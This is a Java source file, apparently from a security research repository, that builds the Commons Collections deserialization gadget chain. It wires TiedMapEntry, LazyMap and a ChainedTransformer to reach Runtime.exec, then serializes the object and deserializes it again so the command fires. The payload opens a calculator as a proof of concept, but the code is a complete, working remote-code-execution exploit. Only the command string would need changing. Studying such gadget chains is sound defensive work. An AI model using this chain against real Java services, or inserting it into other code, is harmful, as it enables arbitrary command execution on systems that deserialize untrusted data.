package com.trganda.gadget.tiedmapentry;

import com.trganda.gadget.utils.Reflections;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;

public class TiedMapEntryHashMapExec {

    public static Object getObject() throws Exception {
        ChainedTransformer fakeTransformer =
            new ChainedTransformer(new Transformer[] {new ConstantTransformer("1")});
        ChainedTransformer chainedTransformer =
            new ChainedTransformer(
                new Transformer[] {
                    new ConstantTransformer(Runtime.class),
                    new InvokerTransformer(
                        "getMethod",
                        new Class[] {String.class, Class[].class},
                        new Object[] {"getRuntime", new Class[0]}),
                    new InvokerTransformer(
                        "invoke",
                        new Class[] {Object.class, Object[].class},
                        new Object[] {null, new Object[0]}),
                    new InvokerTransformer(
                        "exec",
                        new Class[] {String.class},
                        new Object[] {"open -a calculator"})
                });

        LazyMap lazyMap = (LazyMap) LazyMap.decorate(new HashMap<>(), fakeTransformer);

        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, "fake");

        HashMap hashMap = new HashMap<>();
        hashMap.put(tiedMapEntry, "v");

        Reflections.setFieldValue(lazyMap, "factory", chainedTransformer);

        // 修改 key 的值，从而触发 LazyMap#get 中 factory.transform 方法的执行
        Reflections.setFieldValue(tiedMapEntry, "key", "k");

        return hashMap;
    }

    public static void main(String[] args) throws Exception {
        ObjectOutputStream oos =
            new ObjectOutputStream(
                Files.newOutputStream(Paths.get("target/TiedMapEntryHashMapExec.bin")));
        oos.writeObject(getObject());

        ObjectInputStream ois =
            new ObjectInputStream(
                Files.newInputStream(Paths.get("target/TiedMapEntryHashMapExec.bin")));
        ois.readObject();
    }
}
